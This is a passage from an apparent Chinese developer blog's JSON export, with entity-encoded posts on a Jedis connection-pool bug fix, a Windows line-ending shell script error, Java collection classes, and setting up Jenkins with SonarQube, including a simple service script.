&#x76F8;&#x5173;&#x4EE3;&#x7801;&#x4EE3;&#x7801;&#x4FEE;&#x6539;&#x524D;&#x5927;&#x81F4;&#x5982;&#x4E0B;:12345public void closeResource(Jedis jedis) { if (null != jedis) { jedisPool.returnResource(jedis); } } &#x4EE3;&#x7801;&#x4FEE;&#x6539;&#x540E;&#x5927;&#x81F4;&#x5982;&#x4E0B;&#x3010;isOK&#x6B63;&#x5E38;&#x8BBE;&#x4E3A;true&#xFF0C;&#x6355;&#x83B7;&#x5230;&#x5F02;&#x5E38;&#x5982;JedisConnectionException&#x65F6;&#x4F20;&#x5165;false&#x3011;:12345678910public void closeResource(Jedis jedis, boolean isOK) { if (null != jedis) { if(!isOK){ LOG.error(&quot;do some things..&quot;); jedisPool.returnBrokenResource(jedis); }else{ jedisPool.returnResource(jedis); } } } &#x76F8;&#x5173;&#x6E90;&#x7801;&#xFF1A; &#x5206;&#x6790;&#x6E90;&#x4EE3;&#x7801;&#xFF0C;&#x53EF;&#x4EE5;&#x77E5;&#x9053;&#x672C;&#x6765;&#x5E94;&#x8BE5;&#x6267;&#x884C;returnBrokenResourceObject&#x65B9;&#x6CD5;&#xFF0C;&#x7ED3;&#x679C;&#x5374;&#x6267;&#x884C;&#x4E86;returnResourceObject&#xFF0C;&#x5E76;&#x4E14;&#x6267;&#x884C;returnResourceObject&#x8FC7;&#x7A0B;&#x4E2D;&#x6CA1;&#x6709;&#x62A5;&#x9519;&#x3002; &#x5177;&#x4F53;&#x539F;&#x56E0;&#x5E94;&#x8BE5;&#x5C31;&#x5728;&#x65B9;&#x6CD5;&#x4F53;&#x91CC;&#x9762;&#xFF0C;&#x53EF;&#x60DC;&#x70B9;&#x8FDB;&#x53BB;&#x5E76;&#x6CA1;&#x6709;&#x5206;&#x6790;&#x51FA;&#x5177;&#x4F53;&#x662F;&#x54EA;&#x51E0;&#x884C;&#x4EE3;&#x7801;&#x5BFC;&#x81F4;&#x4E86;&#x4E32;&#x53F7;&#x7684;&#x51FA;&#x73B0; = =!&#x4E0D;&#x8FC7;&#x5F53;&#x65F6;&#x9879;&#x76EE;return&#x65B9;&#x9762;&#x8FDB;&#x884C;&#x4E86;&#x4FEE;&#x6539;&#x540E;&#xFF0C;&#x9519;&#x8BEF;&#x786E;&#x5B9E;&#x6CA1;&#x6709;&#x518D;&#x51FA;&#x73B0;&#x3002; &#x4E0B;&#x9762;&#x8FD9;&#x7BC7;&#x6587;&#x7AE0;&#x4E5F;&#x8BB2;&#x89E3;&#x4E86;returnSource&#x7684;&#x76F8;&#x5173;&#x6CE8;&#x610F;&#x4E8B;&#x9879;&#xFF0C;&#x5927;&#x5BB6;&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x4E0B;http://www.codeweblog.com/jedis-returnresource&#x4F7F;&#x7528;&#x6CE8;&#x610F;&#x4E8B;&#x9879;/ PS&#xFF1A;&#x5F53;&#x65F6;&#x9879;&#x76EE;&#x4F7F;&#x7528;&#x7684;&#x662F;Jedis2.7.0&#xFF0C;&#x4E0D;&#x7528;&#x901A;&#x8FC7;&#x56FE;&#x7247;1&#x53EF;&#x4EE5;&#x53D1;&#x73B0;Jedis3.0&#x540E;&#xFF0C;returnResource&#x5C31;&#x4E0D;&#x4F7F;&#x7528;&#x4E86;&#xFF0C;&#x5EFA;&#x8BAE;&#x7528;close&#x66FF;&#x6362;&#x3002;&#x5373;&#xFF1A;jedisPool.returnResource(jedis) &#x2014;&gt; jedis.close();","raw":null,"content":null,"categories":[{"name":"错误集锦","slug":"错误集锦","permalink":"http://www.wangxin123.com/categories/错误集锦/"}],"tags":[{"name":"redis","slug":"redis","permalink":"http://www.wangxin123.com/tags/redis/"}]},{"title":"sh脚本异常,binsh^M bad interpreter No such file or directory","slug":"sh脚本异常,binsh^M bad interpreter No such file or directory","date":"2016-06-18T10:24:17.000Z","updated":"2016-11-17T11:59:42.674Z","comments":true,"path":"2016/06/18/sh脚本异常,binsh^M bad interpreter No such file or directory/","link":"","permalink":"http://www.wangxin123.com/2016/06/18/sh脚本异常,binsh^M bad interpreter No such file or directory/","excerpt":"","keywords":null,"text":"&#x9519;&#x8BEF;&#x5728;Linux&#x4E2D;&#x6267;&#x884C;.sh&#x811A;&#x672C;&#xFF0C;&#x51FA;&#x73B0;&#x5982;&#x4E0B;&#x5F02;&#x5E38;1/bin/sh^M: bad interpreter: No such file or directory &#x539F;&#x56E0;&#x5728;windows&#x7CFB;&#x7EDF;&#x4E2D;&#x7F16;&#x8F91;&#x7684;.sh&#x6587;&#x4EF6;&#x53EF;&#x80FD;&#x6709;&#x4E0D;&#x53EF;&#x89C1;&#x5B57;&#x7B26;&#xFF0C;&#x6240;&#x4EE5;&#x5728;Linux&#x7CFB;&#x7EDF;&#x4E0B;&#x6267;&#x884C;&#x4F1A;&#x62A5;&#x4EE5;&#x4E0A;&#x5F02;&#x5E38;&#x4FE1;&#x606F;&#x3002; &#x89E3;&#x51B3;&#x5728;windows&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;&#x5229;&#x7528;&#x4E00;&#x4E9B;&#x7F16;&#x8F91;&#x5668;&#x5982;UltraEdit&#x6216;EditPlus&#x7B49;&#x5DE5;&#x5177;&#x5148;&#x5C06;&#x811A;&#x672C;&#x7F16;&#x7801;&#x8F6C;&#x6362;&#xFF0C;&#x518D;&#x653E;&#x5230;Linux&#x4E2D;&#x6267;&#x884C;&#x3002;&#x8F6C;&#x6362;&#x65B9;&#x5F0F;&#x5982;&#x4E0B;&#xFF08;UltraEdit&#xFF09;&#xFF1A;File&#x2013;&gt;Conversions&#x2013;&gt;DOS-&gt;UNIX&#x5373;&#x53EF;&#x3002; &#x5728;Linux&#x4E0B;&#x8F6C;&#x6362;&#xFF1A;&#x9996;&#x5148;&#x8981;&#x786E;&#x4FDD;&#x6587;&#x4EF6;&#x6709;&#x53EF;&#x6267;&#x884C;&#x6743;&#x9650;1chmod a+x filename &#x7136;&#x540E;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x683C;&#x5F0F;&#x5229;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x67E5;&#x770B;&#x6587;&#x4EF6;&#x683C;&#x5F0F;12vi filename:set ff &#x6216; :set fileformat &#x53EF;&#x4EE5;&#x770B;&#x5230;&#x5982;&#x4E0B;&#x4FE1;&#x606F;1fileformat=dos &#x6216; fileformat=unix &#x5229;&#x7528;&#x5982;&#x4E0B;&#x547D;&#x4EE4;&#x4FEE;&#x6539;&#x6587;&#x4EF6;&#x683C;&#x5F0F;12:set ff=unix &#x6216; :set fileformat=unix :wq (&#x5B58;&#x76D8;&#x9000;&#x51FA;) &#x6700;&#x540E;&#x518D;&#x6267;&#x884C;&#x6587;&#x4EF6; 1./filename","raw":null,"content":null,"categories":[{"name":"错误集锦","slug":"错误集锦","permalink":"http://www.wangxin123.com/categories/错误集锦/"}],"tags":[]},{"title":"Java集合类从属关系","slug":"Java集合类从属关系","date":"2016-06-11T13:18:00.000Z","updated":"2017-01-09T09:08:37.406Z","comments":true,"path":"2016/06/11/Java集合类从属关系/","link":"","permalink":"http://www.wangxin123.com/2016/06/11/Java集合类从属关系/","excerpt":"1&#x3001;&#x96C6;&#x5408;&#x5173;&#x7CFB;&#x56FE;","keywords":null,"text":"1&#x3001;&#x96C6;&#x5408;&#x5173;&#x7CFB;&#x56FE; Java&#x7684;&#x96C6;&#x5408;&#x5206;&#x4E3A;&#x4E86;&#x56DB;&#x7C7B;&#xFF1A;List Set Queue Map&#xFF0C;&#x6BCF;&#x7C7B;&#x90FD;&#x6709;&#x4E0D;&#x540C;&#x7684;&#x5B9E;&#x73B0;&#xFF0C;&#x6709;&#x57FA;&#x4E8E;&#x6570;&#x7EC4;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x6709;&#x57FA;&#x4E8E;&#x94FE;&#x8868;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x6709;&#x57FA;&#x4E8E;xx&#x6811;&#x5B9E;&#x73B0;&#x7684;&#xFF0C;&#x4E0D;&#x540C;&#x7684;&#x5B9E;&#x73B0;&#x867D;&#x5728;&#x529F;&#x80FD;&#x4E0A;&#x53EF;&#x4EE5;&#x76F8;&#x4E92;&#x66FF;&#x4EE3;&#x4F46;&#x90FD;&#x6709;&#x5404;&#x81EA;&#x7684;&#x5E94;&#x7528;&#x573A;&#x666F;&#xFF0C;&#x5982;&#x57FA;&#x4E8E;&#x6570;&#x7EC4;&#x7684;&#x5B9E;&#x73B0;&#x64C5;&#x957F;&#x5FEB;&#x901F;&#x904D;&#x5386;&#xFF0C;&#x57FA;&#x4E8E;&#x94FE;&#x8868;&#x7684;&#x5B9E;&#x73B0;&#x64C5;&#x957F;&#x968F;&#x673A;&#x5199;&#xFF0C;&#x57FA;&#x4E8E;&#x6811;&#x7684;&#x5B9E;&#x73B0;&#x53EF;&#x6392;&#x5E8F;&#x7B49;&#x7B49;&#x3002; JDK1.5&#x53CA;&#x4EE5;&#x540E;&#x8FD8;&#x6DFB;&#x52A0;&#x4E86;&#x5F88;&#x591A;&#x5B9E;&#x7528;&#x7684;&#x529F;&#x80FD;&#xFF0C;&#x5982;ConcurrentMap&#x3001;CopyOnWriteArray&#x3001;ListBlockingQueue&#x3001;BlockingDeque&#x3001;CopyOnWriteArraySet&#x7B49;&#x7B49;&#xFF0C;&#x53E6;&#x5916;&#xFF0C;Collections&#x5DE5;&#x5177;&#x7C7B;&#x4E5F;&#x63D0;&#x4F9B;&#x4E86;&#x5F88;&#x591A;&#x65B9;&#x4FBF;&#x7684;API&#xFF0C;&#x5982; synchronizedCollection&#x3001;binarySearch&#x3001;checkedCollection&#x3001;copy&#x3001;indexOfSubList&#x3001;reverse&#x3001;singletonList&#x7B49;&#x7B49;&#xFF0C;&#x8FD9;&#x7ED9;&#x6211;&#x4EEC;&#x63D0;&#x4F9B;&#x4E86;&#x975E;&#x5E38;&#x591A;&#x7684;&#x9009;&#x62E9;&#x3002; &#x591A;&#x7EBF;&#x7A0B;&#x4E0B;&#x4F7F;&#x7528;&#xFF0C;&#x9700;&#x8981;&#x4FDD;&#x8BC1;&#x7EBF;&#x7A0B;&#x5B89;&#x5168;&#xFF0C;&#x8BFB;&#x64CD;&#x4F5C;&#x8FDC;&#x5927;&#x4E0E;&#x5199;&#x64CD;&#x4F5C;&#xFF0C;&#x4F8B;&#x5982;&#x7F13;&#x5B58;&#x7CFB;&#x7EDF;&#xFF0C;&#x4F7F;&#x7528;CopyOnWriteArray&#x2026;&#x4E5F;&#x8BB8;&#x4F1A;&#x662F;&#x4E0D;&#x9519;&#x7684;&#x9009;&#x62E9;&#xFF0C;&#x6B64;&#x5916;Concurrent&#x2026;&#x4E5F;&#x4E0D;&#x9519;&#x3002;&#x5982;&#x679C;&#x5728;&#x591A;&#x7EBF;&#x7A0B;&#x95F4;&#x8FD8;&#x9700;&#x8981;&#x534F;&#x4F5C;&#x901A;&#x4FE1;&#x7B49;&#xFF0C;&#x90A3;&#x4E48;&#x963B;&#x585E;&#x961F;&#x5217;BlockingQueue&#x3001;BlockingDeque&#xFF08;&#x53CC;&#x7AEF;&#x961F;&#x5217;&#xFF0C;&#x65E2;&#x53EF;&#x4EE5;&#x5728;&#x961F;&#x5217;&#x7684;&#x524D;&#x7AEF;&#x8FDB;&#x884C;&#x63D2;&#x5165;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x5728;&#x961F;&#x5217;&#x7684;&#x540E;&#x7AEF;&#x8FDB;&#x884C;&#x63D2;&#x5165;&#x5220;&#x9664;&#x64CD;&#x4F5C;&#xFF0C;&#x5177;&#x6709;&#x961F;&#x5217;&#x548C;&#x6808;&#x7684;&#x7279;&#x5F81;&#xFF09;&#x4F1A;&#x662F;&#x6700;&#x5408;&#x9002;&#x7684;&#x9009;&#x62E9;&#x3002;&#x5982;&#x679C;&#x8FD9;&#x8FD8;&#x4E0D;&#x591F;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x5E26;&#x4F18;&#x5148;&#x7EA7;&#x7684;PriorityBlockingQueue&#x66F4;&#x79D2;&#x7684;&#x5730;&#x65B9;&#x6211;&#x4EEC;&#x8FD8;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;DelayQueue&#x5EF6;&#x8FDF;&#x961F;&#x5217;&#xFF0C;&#x5982;&#x679C;&#x4F60;&#x7684;&#x521B;&#x9020;&#x529B;&#x591F;&#x5F3A;&#x7684;&#x8BDD;&#xFF0C;&#x7528;DelayQueue&#x6765;&#x5B9E;&#x73B0;&#x4E00;&#x4E9B;&#x8D85;&#x65F6;&#x7BA1;&#x7406;&#xFF08;&#x5982;Session&#x8D85;&#x65F6;&#x5904;&#x7406;&#x3001;&#x8BF7;&#x6C42;&#x8D85;&#x65F6;&#x5904;&#x7406;&#xFF09;&#x4F1A;&#x6709;&#x975E;&#x5E38;&#x4F18;&#x96C5;&#x548C;&#x5947;&#x5999;&#x7684;&#x6548;&#x679C; &#x3002; &#x5982;&#x679C;&#x4E0D;&#x4F1A;&#x6D89;&#x53CA;&#x591A;&#x7EBF;&#x7A0B;&#x5E76;&#x53D1;&#x8BBF;&#x95EE;&#xFF0C;&#x5982;&#x65B9;&#x6CD5;&#x5185;&#x90E8;&#x3001;&#x540C;&#x6B65;&#x8BBF;&#x95EE;&#x533A;&#x7B49;&#xFF0C;&#x5982;&#x679C;&#x6709;&#x968F;&#x673A;&#x5199;&#x7684;&#x9700;&#x6C42;&#x53EF;&#x4EE5;&#x8003;&#x8651;LinkedList&#x6216;LinkedHashSet&#x5982;&#x679C;&#x9700;&#x8981;&#x5FEB;&#x901F;&#x68C0;&#x7D22;&#x5143;&#x7D20;&#x662F;&#x5426;&#x5DF2;&#x7ECF;&#x5B58;&#x5728;&#x4E8E;&#x96C6;&#x5408;&#x5185;&#x53EF;&#x4EE5;&#x8003;&#x8651;&#x4F7F;&#x7528;HashMap&#x3001;HashSet&#x5982;&#x679C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x975E;&#x5E38;&#x9891;&#x7E41;&#x4E14;&#x9AD8;&#x6548;&#x7684;&#x904D;&#x5386;&#x5219;&#x5E94;&#x8BE5;&#x91C7;&#x7528;ArrayList&#x5982;&#x679C;&#x6211;&#x4EEC;&#x9700;&#x8981;&#x6392;&#x5E8F;&#xFF0C;&#x90A3;&#x4E48;&#x5C31;&#x5FC5;&#x9700;&#x8981;&#x9009;&#x62E9;TreeMap&#x3001;TreeSet&#x55BD;&#x53E6;&#x5916;&#xFF0C;LinkedList&#x540C;&#x65F6;&#x5B9E;&#x73B0;&#x4E86;List&#x3001;Deque&#x3001;Queue&#x63A5;&#x53E3;&#xFF0C;&#x7528;&#x5176;&#x6765;&#x5B9E;&#x73B0;Stack&#x4E5F;&#x662F;&#x53EF;&#x4EE5;&#x7684;&#x3002; 2&#x3001;&#x300A;&#x7F16;&#x7A0B;&#x601D;&#x60F3;&#x300B;&#x76F8;&#x5173;&#x6982;&#x5FF5; 3&#x3001;&#x96C6;&#x5408;&#x7C7B;&#x4E3A;&#x4EC0;&#x4E48;&#x4E5F;&#x79F0;&#x4E3A;&#x5BB9;&#x5668;&#x7C7B;&#xFF1F;","raw":null,"content":null,"categories":[{"name":"WEB后端","slug":"WEB后端","permalink":"http://www.wangxin123.com/categories/WEB后端/"}],"tags":[{"name":"集合","slug":"集合","permalink":"http://www.wangxin123.com/tags/集合/"},{"name":"疑难杂症","slug":"疑难杂症","permalink":"http://www.wangxin123.com/tags/疑难杂症/"}]},{"title":"SonarQube+Jenkins,搭建持续交付平台","slug":"SonarQube+Jenkins,搭建持续交付平台","date":"2016-06-10T14:22:00.000Z","updated":"2017-02-21T08:40:22.894Z","comments":true,"path":"2016/06/10/SonarQube+Jenkins,搭建持续交付平台/","link":"","permalink":"http://www.wangxin123.com/2016/06/10/SonarQube+Jenkins,搭建持续交付平台/","excerpt":"&#x524D;&#x8A00;Kurt Bittner&#x66FE;&#x8BF4;&#x8FC7;&#xFF0C;&#x5982;&#x679C;&#x654F;&#x6377;&#x4EC5;&#x4EC5;&#x53EA;&#x662F;&#x5F00;&#x59CB;&#xFF0C;&#x90A3;&#x6301;&#x7EED;&#x4EA4;&#x4ED8;&#x5C31;&#x662F;&#x5934;&#x6761;!&#x201C;If Agile Was the Opening Act, Continuous Delivery is the Headliner!&#x201D;&#x2014;&#x2014;Kurt Bittner &#x4E94;&#x6708;&#x4E0A;&#x65EC;&#x6211;&#x7684;&#x4E00;&#x4E2A;&#x4E3B;&#x8981;&#x5DE5;&#x4F5C;&#x5C31;&#x662F;&#x642D;&#x5EFA;&#x6301;&#x7EED;&#x4EA4;&#x4ED8;&#x5E73;&#x53F0;&#x3002;&#x6253;&#x7B97;&#x4EE5;Jenkins&#x4E3A;&#x6838;&#x5FC3;&#xFF0C;&#x6BCF;&#x5929;&#x5B9A;&#x65F6;&#x4ECE;&#x4EE3;&#x7801;&#x5E93;&#x4E2D;&#x68C0;&#x51FA;&#x6700;&#x65B0;&#x7684;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x7F16;&#x8BD1;&#x3001;&#x6784;&#x5EFA;&#x3002;&#x6784;&#x5EFA;&#x7ED3;&#x679C;&#x901A;&#x8FC7;&#x81EA;&#x52A8;&#x53D1;&#x9001;&#x7684;&#x90AE;&#x4EF6;&#x901A;&#x77E5;&#x5230;&#x9879;&#x76EE;&#x7EC4;&#xFF0C;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x6BCF;&#x5929;&#x53EA;&#x9700;&#x5173;&#x5FC3;&#x6700;&#x65B0;&#x7684;&#x96C6;&#x6210;&#x7ED3;&#x679C;&#x662F;&#x5426;&#x6B63;&#x786E;&#x5373;&#x53EF;&#x3002; &#x518D;&#x642D;&#x5EFA;SonarQube&#x4EE3;&#x7801;&#x8D28;&#x91CF;&#x68C0;&#x6D4B;&#x5DE5;&#x5177;&#xFF0C;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5B9A;&#x65F6;&#x626B;&#x63CF;&#x4EE3;&#x7801;&#x5E93;&#x6700;&#x65B0;&#x4EE3;&#x7801;&#xFF0C;&#x68C0;&#x6D4B;&#x51FA;&#x4EE3;&#x7801;&#x4E2D;&#x7684;&#x5B58;&#x5728;&#x7684;&#x963B;&#x65AD;&#x9519;&#x8BEF;&#x3001;&#x4E25;&#x91CD;&#x9519;&#x8BEF;&#x3001;&#x4E3B;&#x8981;&#x9519;&#x8BEF;&#x3001;&#x6B21;&#x8981;&#x9519;&#x8BEF;&#x548C;&#x76F8;&#x5173;&#x63D0;&#x793A;&#x4FE1;&#x606F;&#x3002;&#x901A;&#x8FC7;SonarQube&#x80FD;&#x6709;&#x6548;&#x7B80;&#x6D01;&#x7EDF;&#x4E00;&#x4EE3;&#x7801;&#x98CE;&#x683C;&#xFF0C;&#x5229;&#x4E8E;&#x5927;&#x5BB6;&#x66F4;&#x597D;&#x7684;&#x76F8;&#x4E92;&#x7406;&#x89E3;&#x548C;&#x540E;&#x671F;&#x6392;&#x67E5;&#x3002; &#x4EE5;&#x4E0B;&#x662F;&#x642D;&#x5EFA;&#x8FC7;&#x7A0B;&#x4E2D;&#x7528;&#x5230;&#x7684;&#x76F8;&#x5173;&#x7F51;&#x7AD9;&#x53CA;&#x78B0;&#x5230;&#x7684;&#x5751;&#x3002; &#x76F8;&#x5173;&#x7F51;&#x7AD9;Sonar&#x5B98;&#x65B9;&#x7F51;&#x7AD9;&#xFF1A;http://www.sonarqube.org/Jenkins&#x5B98;&#x65B9;&#x4F7F;&#x7528;&#x6559;&#x7A0B;&#xFF1A;https://wiki.jenkins-ci.org/display/JENKINS/Use+JenkinsJenkins&#x5B89;&#x88C5;&#x94FE;&#x63A5;&#xFF1A;http://www.cnblogs.com/zhangqingsh/archive/2013/03/19/2968998.htmlSonar&#x5B89;&#x88C5;&#x94FE;&#x63A5;&#xFF1A;http://flyingdutchman.iteye.com/blog/1905906Sonar&#x7B80;&#x4ECB;&#x53CA;&#x5B89;&#x88C5;&#x5730;&#x5740;&#xFF1A;http://www.ibm.com/developerworks/cn/opensource/os-sonarqube/Jenkins&#x4F7F;&#x7528;&#x96C6;&#x9526;&#xFF1A;http://my.oschina.net/u/260244/blog/318755?fromerr=ZvUu6dmFJenkins&#x548C;Sonar&#x6574;&#x5408;&#x5730;&#x5740;1&#xFF1A;https://lasithapetthawadu.wordpress.com/2014/05/03/configure-jenkins-with-sonarqube-for-static-code-analysis-and-integration/Jenkins&#x548C;Sonar&#x6574;&#x5408;&#x5730;&#x5740;2&#xFF1A;http://www.cnblogs.com/zhuhongbao/p/4197974.html&#x642D;&#x5EFA;&#x8FC7;&#x7A0B;&#x4E2D;&#x6D89;&#x53CA;&#x5230;&#x7684; JDK&#x3001;Tomcat&#x3001;Mysql&#x3001;Redis&#x3001;Maven&#x7B49;&#x7CFB;&#x5217;&#x5B89;&#x88C5;&#x94FE;&#x63A5;&#x7701;&#x7565; 0.0&#xFF01;","keywords":null,"text":"&#x524D;&#x8A00;Kurt Bittner&#x66FE;&#x8BF4;&#x8FC7;&#xFF0C;&#x5982;&#x679C;&#x654F;&#x6377;&#x4EC5;&#x4EC5;&#x53EA;&#x662F;&#x5F00;&#x59CB;&#xFF0C;&#x90A3;&#x6301;&#x7EED;&#x4EA4;&#x4ED8;&#x5C31;&#x662F;&#x5934;&#x6761;!&#x201C;If Agile Was the Opening Act, Continuous Delivery is the Headliner!&#x201D;&#x2014;&#x2014;Kurt Bittner &#x4E94;&#x6708;&#x4E0A;&#x65EC;&#x6211;&#x7684;&#x4E00;&#x4E2A;&#x4E3B;&#x8981;&#x5DE5;&#x4F5C;&#x5C31;&#x662F;&#x642D;&#x5EFA;&#x6301;&#x7EED;&#x4EA4;&#x4ED8;&#x5E73;&#x53F0;&#x3002;&#x6253;&#x7B97;&#x4EE5;Jenkins&#x4E3A;&#x6838;&#x5FC3;&#xFF0C;&#x6BCF;&#x5929;&#x5B9A;&#x65F6;&#x4ECE;&#x4EE3;&#x7801;&#x5E93;&#x4E2D;&#x68C0;&#x51FA;&#x6700;&#x65B0;&#x7684;&#x4EE3;&#x7801;&#x8FDB;&#x884C;&#x7F16;&#x8BD1;&#x3001;&#x6784;&#x5EFA;&#x3002;&#x6784;&#x5EFA;&#x7ED3;&#x679C;&#x901A;&#x8FC7;&#x81EA;&#x52A8;&#x53D1;&#x9001;&#x7684;&#x90AE;&#x4EF6;&#x901A;&#x77E5;&#x5230;&#x9879;&#x76EE;&#x7EC4;&#xFF0C;&#x5F00;&#x53D1;&#x4EBA;&#x5458;&#x6BCF;&#x5929;&#x53EA;&#x9700;&#x5173;&#x5FC3;&#x6700;&#x65B0;&#x7684;&#x96C6;&#x6210;&#x7ED3;&#x679C;&#x662F;&#x5426;&#x6B63;&#x786E;&#x5373;&#x53EF;&#x3002; &#x518D;&#x642D;&#x5EFA;SonarQube&#x4EE3;&#x7801;&#x8D28;&#x91CF;&#x68C0;&#x6D4B;&#x5DE5;&#x5177;&#xFF0C;&#x5355;&#x4F4D;&#x65F6;&#x95F4;&#x5B9A;&#x65F6;&#x626B;&#x63CF;&#x4EE3;&#x7801;&#x5E93;&#x6700;&#x65B0;&#x4EE3;&#x7801;&#xFF0C;&#x68C0;&#x6D4B;&#x51FA;&#x4EE3;&#x7801;&#x4E2D;&#x7684;&#x5B58;&#x5728;&#x7684;&#x963B;&#x65AD;&#x9519;&#x8BEF;&#x3001;&#x4E25;&#x91CD;&#x9519;&#x8BEF;&#x3001;&#x4E3B;&#x8981;&#x9519;&#x8BEF;&#x3001;&#x6B21;&#x8981;&#x9519;&#x8BEF;&#x548C;&#x76F8;&#x5173;&#x63D0;&#x793A;&#x4FE1;&#x606F;&#x3002;&#x901A;&#x8FC7;SonarQube&#x80FD;&#x6709;&#x6548;&#x7B80;&#x6D01;&#x7EDF;&#x4E00;&#x4EE3;&#x7801;&#x98CE;&#x683C;&#xFF0C;&#x5229;&#x4E8E;&#x5927;&#x5BB6;&#x66F4;&#x597D;&#x7684;&#x76F8;&#x4E92;&#x7406;&#x89E3;&#x548C;&#x540E;&#x671F;&#x6392;&#x67E5;&#x3002; &#x4EE5;&#x4E0B;&#x662F;&#x642D;&#x5EFA;&#x8FC7;&#x7A0B;&#x4E2D;&#x7528;&#x5230;&#x7684;&#x76F8;&#x5173;&#x7F51;&#x7AD9;&#x53CA;&#x78B0;&#x5230;&#x7684;&#x5751;&#x3002; &#x76F8;&#x5173;&#x7F51;&#x7AD9;Sonar&#x5B98;&#x65B9;&#x7F51;&#x7AD9;&#xFF1A;http://www.sonarqube.org/Jenkins&#x5B98;&#x65B9;&#x4F7F;&#x7528;&#x6559;&#x7A0B;&#xFF1A;https://wiki.jenkins-ci.org/display/JENKINS/Use+JenkinsJenkins&#x5B89;&#x88C5;&#x94FE;&#x63A5;&#xFF1A;http://www.cnblogs.com/zhangqingsh/archive/2013/03/19/2968998.htmlSonar&#x5B89;&#x88C5;&#x94FE;&#x63A5;&#xFF1A;http://flyingdutchman.iteye.com/blog/1905906Sonar&#x7B80;&#x4ECB;&#x53CA;&#x5B89;&#x88C5;&#x5730;&#x5740;&#xFF1A;http://www.ibm.com/developerworks/cn/opensource/os-sonarqube/Jenkins&#x4F7F;&#x7528;&#x96C6;&#x9526;&#xFF1A;http://my.oschina.net/u/260244/blog/318755?fromerr=ZvUu6dmFJenkins&#x548C;Sonar&#x6574;&#x5408;&#x5730;&#x5740;1&#xFF1A;https://lasithapetthawadu.wordpress.com/2014/05/03/configure-jenkins-with-sonarqube-for-static-code-analysis-and-integration/Jenkins&#x548C;Sonar&#x6574;&#x5408;&#x5730;&#x5740;2&#xFF1A;http://www.cnblogs.com/zhuhongbao/p/4197974.html&#x642D;&#x5EFA;&#x8FC7;&#x7A0B;&#x4E2D;&#x6D89;&#x53CA;&#x5230;&#x7684; JDK&#x3001;Tomcat&#x3001;Mysql&#x3001;Redis&#x3001;Maven&#x7B49;&#x7CFB;&#x5217;&#x5B89;&#x88C5;&#x94FE;&#x63A5;&#x7701;&#x7565; 0.0&#xFF01; sonar&#x6DFB;&#x52A0;service&#x670D;&#x52A1;1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950# &#x7F16;&#x5199;&#x7B80;&#x5355;&#x7684;sonar&#x542F;&#x52A8;&#x811A;&#x672C;vim /etc/init.d/sonar[sonar]#!/bin/sh start() { /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh start} stop() { /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh stop}status() { /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh status}restart() { /data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh restart} SONAR=&quot;/data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh&quot;[ -f $SONAR ] || exit 1 # See how we were called. case &quot;$1&quot; in start) start ;; stop) stop ;; restart) restart ;; status) status ;; # stop sleep 3 start ;; *) echo $&quot;Usage: $0 {start|stop|status|restart}&quot; exit 1 esac exit 0 # sonar&#x670D;&#x52A1;&#x9A8C;&#x8BC1;service sonar statusservice sonar startservice sonar restartservice sonar stop &#x95EE;&#x9898;&#xFF1A;&#x9A8C;&#x8BC1;service&#x670D;&#x52A1;&#x65F6;&#xFF0C;&#x53D1;&#x73B0;&#x56DB;&#x4E2A;&#x547D;&#x4EE4;&#x552F;&#x72EC; service sonar start &#x547D;&#x4EE4;&#x5931;&#x8D25;&#xFF0C;&#x4F46;&#x662F;&#x624B;&#x52A8;&#x8F93;&#x5165;&#x4E0B;&#x9762;&#x547D;&#x4EE4;&#x5374;&#x53EF;&#x4EE5;&#x542F;&#x52A8;&#x6210;&#x529F;&#x3010;&#x6DFB;&#x52A0;sonar&#x81EA;&#x542F;&#x52A8;&#x670D;&#x52A1;&#x65F6;&#x4E5F;&#x51FA;&#x73B0;&#x540C;&#x6837;&#x95EE;&#x9898;&#x3011;&#x3002;1/data/sonar/sonarqube-5.6.1/bin/linux-x86-64/sonar.sh start &#x6211;&#x4EEC;&#x67E5;&#x770B;&#x76F8;&#x5173;&#x65E5;&#x5FD7;&#xFF1A;1234567#tail -f /data/sonar/sonarqube-5.6.1/logs/sonar.log--&gt; Wrapper Started as DaemonLaunching a JVM...Unable to start JVM: No such file or directory (2)JVM exited while loading the application.JVM Restarts disabled. Shutting down.&lt;-- Wrapper Stopped log&#x63D0;&#x793A;&#x4E0D;&#x80FD;&#x52A0;&#x8F7D;JVM&#xFF0C;&#x63A5;&#x7740;&#x67E5;&#x770B;sonar&#x7684;wrapper.conf&#x6587;&#x4EF6;123456vim /data/sonar/sonarqube-5.6.1/conf/wrapper.conf# Path to JVM executable. By default it must be available in PATH.# Can be an absolute path, for example:#wrapper.java.command=/path/to/my/jdk/bin/javawrapper.java.command=/java wrapper.conf&#x6587;&#x4EF6;&#x63D0;&#x793A;wrapper.java.command&#x9700;&#x8981;&#x914D;&#x7F6E;java&#x8DEF;&#x5F84;&#xFF0C;&#x9ED8;&#x8BA4;&#x8DEF;&#x5F84;&#x663E;&#x7136;&#x6709;&#x8BEF;&#xFF0C;&#x4FEE;&#x6539;&#x540E;&#xFF0C;&#x518D;&#x6B21;&#x8FD0;&#x884C;&#x3010;service sonar start&#x3011;&#xFF0C;&#x64CD;&#x4F5C;&#x6210;&#x529F;&#x3002;1wrapper.java.command=/usr/java/jdk1.8.0_31/bin/java 